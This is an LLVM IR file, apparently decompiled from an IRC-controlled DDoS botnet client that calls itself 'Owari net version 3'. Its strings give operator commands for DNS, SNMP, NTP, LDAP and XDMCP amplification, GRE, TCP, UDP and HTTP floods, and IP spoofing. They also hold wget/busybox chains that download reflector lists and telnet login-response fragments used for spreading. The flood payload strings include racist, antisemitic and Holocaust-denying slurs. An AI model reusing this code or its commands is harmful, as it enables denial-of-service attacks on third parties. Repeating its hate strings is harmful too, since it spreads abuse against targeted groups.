source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%pollfd = type { i32, i16, i16 }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%rlimit = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%timespec = type { i32, i32 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8070638.21 = global i32 0
@global_var_8070664.22 = local_unnamed_addr global i32* @global_var_8070638.21
@global_var_806f624.23 = constant i32 0
@global_var_80756a4.24 = global i32 0
@global_var_807063c.25 = local_unnamed_addr global i32 0
@global_var_8069625.26 = constant [7 x i8] c"x86_32\00"
@global_var_807e1b0.29 = local_unnamed_addr global i32 0
@global_var_806962c.30 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_80756d4.31 = local_unnamed_addr global i32 0
@global_var_807f354.32 = local_unnamed_addr global i32 0
@global_var_806964c.35 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_807e1a4.36 = local_unnamed_addr global i32 0
@global_var_806968b.37 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_80696a4.38 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_80696c8.39 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_80696ed.40 = constant [8 x i8] c"http://\00"
@global_var_80696f8.41 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_8069720.42 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_8069748.43 = constant [276 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_806985c.44 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_8069878.45 = constant [3 x i8] c"wb\00"
@global_var_806987b.46 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8069880.47 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_8069898.48 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_80698b8.49 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_80698e8.50 = constant [70 x i8] c"NOTICE %s :Owari net version: 3 by Kuze-senpai, Milenko and Morpheus\0A\00"
@global_var_806992e.51 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_8069948.52 = constant [54 x i8] c"NOTICE %s :Nick cannot be larger than 32 characters.\0A\00"
@global_var_807e1ac.53 = local_unnamed_addr global i32 0
@global_var_806997e.54 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_806998f.56 = constant [16 x i8] c"NICK [%s|%s]%s\0A\00"
@global_var_806999f.57 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_80699e0.60 = constant [34 x i8] c"NOTICE %s :Current status is: %s\0A\00"
@global_var_8069a02.61 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_8069a20.62 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_807e0a0.63 = global i32 0
@global_var_8069a48.64 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_8069a67.65 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_8069a81.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_8069a9e.67 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_8069ab9.68 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_8069ad8.69 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_8069af8.70 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_8075ae0.71 = global i32 0
@global_var_8069b44.72 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_8075b00.73 = global i32 0
@global_var_8075b04.74 = local_unnamed_addr global i32 0
@global_var_8075b08.75 = local_unnamed_addr global i32 0
@global_var_8070d84.76 = local_unnamed_addr global i32 4095
@global_var_8070d80.77 = local_unnamed_addr global i32 362436
@global_var_8069b65.78 = constant [14 x i8] c"192.168.3.100\00"
@global_var_807f300.80 = local_unnamed_addr global i32 0
@global_var_8069b94.81 = constant [67 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\0A\00"
@global_var_8069bd8.82 = constant [171 x i8] c"wget \22%s\22 -q -O DNS.txt || busybox wget \22%s\22 -O DNS.txt || /bin/busybox wget \22%s\22 -O DNS.txt || /usr/busybox wget \22%s\22 -O DNS.txt || /var/run/busybox wget \22%s\22 -O DNS.txt\00"
@1 = constant i32 1313079410
@global_var_8069c85.84 = constant [8 x i8] c"DNS.txt\00"
@global_var_8069c90.85 = constant [36 x i8] c"NOTICE %s :DNS amp attacking %s:%s\0A\00"
@global_var_8069cb4.86 = constant i32 1124073541
@global_var_8069cf8.87 = constant [13 x i8] c"192.168.1.83\00"
@global_var_807e1a8.89 = local_unnamed_addr global i32 0
@global_var_8070d88.90 = local_unnamed_addr global i32 83
@global_var_8069d08.91 = constant [99 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_8069d6c.92 = constant [176 x i8] c"wget \22%s\22 -q -O SNMP.txt || busybox wget \22%s\22 -O SNMP.txt || /bin/busybox wget \22%s\22 -O SNMP.txt || /usr/busybox wget \22%s\22 -O SNMP.txt || /var/run/busybox wget \22%s\22 -O SNMP.txt\00"
@global_var_8069e1c.93 = constant [9 x i8] c"SNMP.txt\00"
@global_var_8069e28.94 = constant [37 x i8] c"NOTICE %s :SNMP amp attacking %s:%s\0A\00"
@global_var_8069e50.95 = constant [89 x i8] c"NOTICE %s :VSE <target IP> <target port> <thread> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_8069eac.96 = constant [32 x i8] c"NOTICE %s :VSE attacking %s:%s\0A\00"
@global_var_8069ecc.97 = constant [35 x i8] c"NOTICE %s :WGETFLOOD <url> <secs>\0A\00"
@global_var_8069eef.98 = constant [29 x i8] c"NOTICE %s :HTTP Flooding %s\0A\00"
@global_var_8069f0c.99 = constant [181 x i8] c"wget -U \22%s\22 -q \22%s\22 -O /dev/null || busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /bin/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /usr/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null &\00"
@global_var_8069fcc.102 = constant [112 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806a03c.103 = constant [171 x i8] c"wget \22%s\22 -q -O NTP.txt || busybox wget \22%s\22 -O NTP.txt || /bin/busybox wget \22%s\22 -O NTP.txt || /usr/busybox wget \22%s\22 -O NTP.txt || /var/run/busybox wget \22%s\22 -O NTP.txt\00"
@global_var_806a0e7.104 = constant [8 x i8] c"NTP.txt\00"
@global_var_806a0f0.105 = constant [36 x i8] c"NOTICE %s :NTP amp attacking %s:%s\0A\00"
@global_var_806a144.107 = constant [41 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs>\00"
@global_var_806a16d.108 = constant [7 x i8] c"socket\00"
@global_var_806a174.109 = constant [28 x i8] c"NOTICE %s :Blacknursing %s\0A\00"
@global_var_806a190.110 = constant [7 x i8] c"sendto\00"
@global_var_807f350.111 = local_unnamed_addr global i32 0
@global_var_806a197.112 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_807f320.113 = global i32 0
@global_var_807e1bc.114 = global i32 0
@global_var_807f304.115 = global i32 0
@global_var_807f338.116 = global i32 0
@global_var_806a1a4.117 = constant [102 x i8] c"NOTICE %s :GRE <target IP> <port dest> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806a20a.118 = constant [29 x i8] c"NOTICE %s :GRE ATTACKING %s\0A\00"
@global_var_806a227.119 = constant [21 x i8] c"TSource Engine Query\00"
@global_var_806a23c.120 = constant [90 x i8] c"NOTICE %s :VSE <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806a296.121 = constant [29 x i8] c"NOTICE %s :VSE ATTACKING %s\0A\00"
@global_var_806a2bc.125 = constant [114 x i8] c"NOTICE %s :XMDCP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806a330.126 = constant [166 x i8] c"wget \22%s\22 -q -O XM.txt || busybox wget \22%s\22 -O XM.txt || /bin/busybox wget \22%s\22 -O XM.txt || /usr/busybox wget \22%s\22 -O XM.txt || /var/run/busybox wget \22%s\22 -O XM.txt\00"
@global_var_806a3d6.127 = constant [7 x i8] c"XM.txt\00"
@global_var_806a3e0.128 = constant [32 x i8] c"NOTICE %s :XDMCP ATTACKING: %s\0A\00"
@global_var_806a434.130 = constant [113 x i8] c"NOTICE %s :LDAP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_806a4a8.131 = constant [176 x i8] c"wget \22%s\22 -q -O LDAP.txt || busybox wget \22%s\22 -O LDAP.txt || /bin/busybox wget \22%s\22 -O LDAP.txt || /usr/busybox wget \22%s\22 -O LDAP.txt || /var/run/busybox wget \22%s\22 -O LDAP.txt\00"
@global_var_806a558.132 = constant [9 x i8] c"LDAP.txt\00"
@global_var_806a564.133 = constant [31 x i8] c"NOTICE %s :LDAP ATTACKING: %s\0A\00"
@global_var_806a584.134 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_806a5ab.135 = constant [25 x i8] c"NOTICE %s :Packeting %s\0A\00"
@global_var_806a5e0.136 = constant i32 2
@global_var_806a630.137 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_806a657.138 = constant [23 x i8] c"NOTICE %s :Panning %s\0A\00"
@global_var_806a700.139 = constant i32 2
@global_var_806a680.140 = constant i32 21
@global_var_806a750.141 = constant [45 x i8] c"NOTICE %s :GIGATCP <target> <method> <secs>\0A\00"
@global_var_806a780.142 = constant [65 x i8] c"NOTICE %s :GIGA-TCP Flooding %s using the ' %s ' method Request\0A\00"
@global_var_806a7c1.143 = constant [4 x i8] c"all\00"
@global_var_806a7c5.144 = constant [5 x i8] c"xmas\00"
@global_var_806a7ca.145 = constant [5 x i8] c"usyn\00"
@global_var_806a7cf.146 = constant [7 x i8] c"GigAck\00"
@global_var_806a7d6.147 = constant [8 x i8] c"GigaSyn\00"
@global_var_806a7de.148 = constant i32 2037579820
@global_var_806a7e0.149 = constant [4 x i8] c"syn\00"
@global_var_806a7e4.150 = constant [4 x i8] c"rst\00"
@global_var_806a7e8.151 = constant [4 x i8] c"fin\00"
@global_var_806a7ec.152 = constant [4 x i8] c"ack\00"
@global_var_806a7f0.153 = constant [4 x i8] c"psh\00"
@global_var_806a7f4.154 = constant [4 x i8] c"urg\00"
@global_var_806a7f8.155 = constant [85 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\0A\00"
@global_var_806a858.158 = constant [49 x i8] c"NOTICE %s :Unknowning %s:%s with packet size %s\0A\00"
@global_var_806a889.160 = constant [4 x i8] c"std\00"
@global_var_806a88d.161 = constant [4 x i8] c"dts\00"
@global_var_806a891.162 = constant [4 x i8] c"lsk\00"
@global_var_806a895.163 = constant [4 x i8] c"kek\00"
@global_var_806a899.164 = constant [6 x i8] c"smack\00"
@global_var_806a89f.165 = constant [4 x i8] c"ily\00"
@global_var_806a8a3.166 = constant [10 x i8] c"tfw no gf\00"
@global_var_806a8ad.167 = constant [11 x i8] c"frienzoned\00"
@global_var_806a8b8.168 = constant [4 x i8] c"tyf\00"
@global_var_806a8bc.169 = constant [4 x i8] c"pos\00"
@global_var_806a8c0.170 = constant [6 x i8] c"cunts\00"
@global_var_806a8c6.171 = constant [9 x i8] c"NullzSec\00"
@global_var_806a8cf.172 = constant [13 x i8] c"NullzSec rox\00"
@global_var_806a8dc.173 = constant [21 x i8] c"Sh4dow on your 4head\00"
@global_var_806a8f1.174 = constant [10 x i8] c"get raped\00"
@global_var_806a8fb.175 = constant [18 x i8] c"not a ddos packet\00"
@global_var_806a90d.176 = constant [23 x i8] c"also not a ddos packet\00"
@global_var_806a924.177 = constant [28 x i8] c"seriously not a ddos packet\00"
@global_var_806a940.178 = constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_806a968.179 = constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_806a990.180 = constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_806a9b8.181 = constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_806a9dd.182 = constant [16 x i8] c"8======D~~~~~~~\00"
@global_var_806a9ed.183 = constant [8 x i8] c"suck it\00"
@global_var_806a9f5.184 = constant [10 x i8] c"give succ\00"
@global_var_806aa00.185 = constant [47 x i8] c"big nigger dick 8============================D\00"
@global_var_806aa2f.186 = constant [18 x i8] c"( . Y . ) tiddies\00"
@global_var_806aa41.187 = constant [9 x i8] c"bigNullz\00"
@global_var_806aa4a.188 = constant [13 x i8] c"eye pee rape\00"
@global_var_806aa57.189 = constant [21 x i8] c"eye pee address rape\00"
@global_var_806aa6c.190 = constant [8 x i8] c"IP rape\00"
@global_var_806aa74.191 = constant [13 x i8] c"This is LOIC\00"
@global_var_806aa81.192 = constant [5 x i8] c"LOIC\00"
@global_var_806aa86.193 = constant [5 x i8] c"HOIC\00"
@global_var_806aa8b.194 = constant [5 x i8] c"XOIC\00"
@global_var_806aa90.195 = constant [7 x i8] c"LHXOIC\00"
@global_var_806aa98.196 = constant [33 x i8] c"A cat is fine too. Desudesudesu~\00"
@global_var_806aab9.197 = constant [18 x i8] c"the biiiiig pussy\00"
@global_var_806aacb.198 = constant [6 x i8] c"benis\00"
@global_var_806aad1.199 = constant [6 x i8] c"penis\00"
@global_var_806aad7.200 = constant [5 x i8] c"dick\00"
@global_var_806aadc.201 = constant [7 x i8] c"vagina\00"
@global_var_806aae3.202 = constant [9 x i8] c"clitoris\00"
@global_var_806aaec.203 = constant [6 x i8] c"pussy\00"
@global_var_806aaf2.204 = constant [4 x i8] c"tfw\00"
@global_var_806aaf6.205 = constant [4 x i8] c":^}\00"
@global_var_806aafa.206 = constant [9 x i8] c"dic pic?\00"
@global_var_806ab03.207 = constant [11 x i8] c"send nudes\00"
@global_var_806ab0e.208 = constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00"
@global_var_806ab2b.209 = constant [24 x i8] c"Never gonna give you up\00"
@global_var_806ab43.210 = constant [25 x i8] c"Never gonna make you cry\00"
@global_var_806ab5c.211 = constant [24 x i8] c"Never gonna let you die\00"
@global_var_806ab74.212 = constant [21 x i8] c"Never gonna hurt you\00"
@global_var_806ab89.213 = constant [14 x i8] c"bush did 9/11\00"
@global_var_806ab98.214 = constant [32 x i8] c"jet fuel can't melt steel beams\00"
@global_var_806abb8.215 = constant [24 x i8] c"Kuze-senpai is your god\00"
@global_var_806abd0.216 = constant [23 x i8] c"the illuminati is real\00"
@global_var_806abe7.217 = constant [14 x i8] c"wake up sheep\00"
@global_var_806abf5.218 = constant [22 x i8] c"i flex like david ike\00"
@global_var_806ac0c.219 = constant [35 x i8] c"6 million jews? show me the proof!\00"
@global_var_806ac2f.220 = constant [18 x i8] c"T R I G G E R E D\00"
@global_var_806ac41.221 = constant [21 x i8] c"my gf killed herself\00"
@global_var_806ac56.222 = constant [22 x i8] c"free masons suck cock\00"
@global_var_806ac6c.223 = constant [10 x i8] c"ihatejews\00"
@global_var_806ac76.224 = constant [6 x i8] c"urgay\00"
@global_var_806ac7c.225 = constant [16 x i8] c"tfw u like dick\00"
@global_var_806ac8c.226 = constant [9 x i8] c"dickbutt\00"
@global_var_806ac95.227 = constant [20 x i8] c"The elusive dickbut\00"
@global_var_806aca9.228 = constant [27 x i8] c"Heyyy that's pretty gooood\00"
@global_var_806acc4.229 = constant [15 x i8] c"NSA sucks cock\00"
@global_var_806acd3.230 = constant [15 x i8] c"FBI sucks cock\00"
@global_var_806ace4.231 = constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00"
@global_var_806ad1b.232 = constant [28 x i8] c"Oh yeah I like nulling shit\00"
@global_var_806ad37.233 = constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00"
@global_var_806ad54.234 = constant [28 x i8] c"Keemstar is a fucking knome\00"
@global_var_806ad70.235 = constant [17 x i8] c"Leafy is gawd <3\00"
@global_var_806ad81.236 = constant [25 x i8] c"Ourmine is full of skids\00"
@global_var_806ad9a.237 = constant [23 x i8] c"Sh4dow is the greatest\00"
@global_var_806adc0.238 = constant [79 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a889.160, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a88d.161, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a891.162, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a895.163, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806a899.164, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a89f.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806a8a3.166, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806a8ad.167, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a8b8.168, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a8bc.169, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806a8c0.170, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806a8c6.171, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806a8cf.172, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806a8dc.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806a8f1.174, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_806a8fb.175, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_806a90d.176, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_806a924.177, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_806a940.178, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_806a968.179, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_806a990.180, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_806a9b8.181, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_806a9dd.182, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806a9ed.183, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806a9f5.184, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_806aa00.185, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_806aa2f.186, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806aa41.187, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806aa4a.188, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806aa57.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806aa6c.190, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806aa57.189, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806aa74.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806aa81.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806aa86.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806aa8b.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806aa90.195, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_806aa98.196, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_806aab9.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806aacb.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806aad1.199, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806aad7.200, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806aadc.201, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806aae3.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806aaec.203, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806aaf2.204, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806aaf6.205, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806aafa.206, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806ab03.207, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_806ab0e.208, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806ab2b.209, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_806ab43.210, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806ab5c.211, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806ab74.212, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806ab89.213, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_806ab98.214, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806abb8.215, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_806abd0.216, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806abe7.217, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_806abf5.218, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_806ac0c.219, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_806ac2f.220, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806ac41.221, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_806ac56.222, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806ac6c.223, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806ac76.224, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_806ac7c.225, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806ac8c.226, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_806ac95.227, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_806aca9.228, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_806acc4.229, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_806acd3.230, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_806ace4.231, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_806ad1b.232, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_806ad37.233, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_806ad54.234, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806ad70.235, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_806ad81.236, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_806ad9a.237, i32 0, i32 0)]
@global_var_806af04.239 = constant [35 x i8] c"NOTICE %s :STD <ip> <port> <time>\0A\00"
@global_var_806af28.240 = constant [32 x i8] c"NOTICE %s :STD attacking %s:%s\0A\00"
@global_var_806af48.241 = constant [7 x i8] c"(null)\00"
@global_var_806af88.242 = constant [92 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\0A\00"
@global_var_806afe4.243 = constant [54 x i8] c"NOTICE %s :TCP flooding %s:%d with %s and %d threads\0A\00"
@global_var_806b034.247 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0AConnection: %s\0D\0A\0D\0A\00"
@global_var_806b074.248 = constant [64 x i8] c"NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\0A\00"
@global_var_806b0b4.249 = constant [46 x i8] c"NOTICE %s :HTTP %s flooding %s with %d power\0A\00"
@global_var_806b0e4.250 = constant [36 x i8] c"NOTICE %s :JUNK <ip> <port> <time>\0A\00"
@global_var_806b108.251 = constant [32 x i8] c"NOTICE %s :JUNK flooding %s:%s\0A\00"
@global_var_806b128.252 = constant [36 x i8] c"NOTICE %s :HOLD <ip> <port> <time>\0A\00"
@global_var_806b14c.253 = constant [32 x i8] c"NOTICE %s :HOLD flooding %s:%s\0A\00"
@global_var_8070d20 = external global i32
@global_var_80695f8.255 = constant i32 4063267
@global_var_80695fc.257 = constant [6 x i8] c"shell\00"
@global_var_806958d.260 = constant [7 x i8] c"nvalid\00"
@global_var_8069594.261 = constant [6 x i8] c"ailed\00"
@global_var_806959a.262 = constant [9 x i8] c"ncorrect\00"
@global_var_80695a3.263 = constant [6 x i8] c"enied\00"
@global_var_80695a9.264 = constant [6 x i8] c"error\00"
@global_var_80695af.265 = constant [8 x i8] c"goodbye\00"
@global_var_80695b7.266 = constant [4 x i8] c"bad\00"
@global_var_80695bb.267 = constant [8 x i8] c"timeout\00"
@global_var_8070cc0.268 = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806958d.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069594.261, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806959a.262, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695a3.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695a9.264, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80695af.265, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80695b7.266, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80695bb.267, i32 0, i32 0)]
@global_var_806b16c.269 = constant [6 x i8] c":>%$#\00"
@global_var_8070c90 = external global i32
@global_var_806b173.275 = constant [3 x i8] c"\0D\0A\00"
@global_var_8069609.276 = constant [5 x i8] c"rror\00"
@global_var_806960e.277 = constant [7 x i8] c"oodbye\00"
@global_var_8068309.278 = constant [8 x i8] c"busybox\00"
